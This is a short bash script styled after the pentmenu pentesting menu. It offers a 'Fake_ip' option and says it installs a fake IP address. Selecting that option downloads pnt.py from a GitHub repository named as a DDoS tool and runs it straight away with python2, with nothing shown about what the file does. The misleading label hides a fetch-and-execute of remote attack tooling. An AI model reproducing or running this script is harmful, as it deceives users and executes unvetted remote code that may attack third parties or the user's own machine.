#!/bin/bash
#set the prompt to show you are in pentmenu and not standard shell
PS3="Pentmenu>"

##MAINMENU##
##################
##START MAINMENU##
mainmenu()
{
#build a main menu using bash select
#from here, the various sub menus can be selected and from them, modules can be run
mainmenu=("Fake_ip" "Quit")
select opt in "${mainmenu[@]}"; do
	if [ "$opt" = "Quit" ]; then
	echo "Quitting...Thank you for using pentmenu!" && sleep 1 && clear
	exit 0
	elif [ "$opt" = "Fake_ip" ]; then
distractionscan
	else
   exit
   fi
done
}

##WELCOME##
#########################
distractionscan()
{ 
wget https://raw.githubusercontent.com/maellambong/DDos-Tool-MrA-/master/pnt.py
python2 pnt.py
}

echo "Welcome to install fake ip address!"
echo "Please report all bugs, improvements and suggestions to https://github.com/GinjaChris/pentmenu/issues"
echo "This software is only for responsible, authorised use."
echo "YOU are responsible for your own actions!"
echo ""
mainmenu
##END WELCOME MESSAGE##
#######################
##/WELCOME##
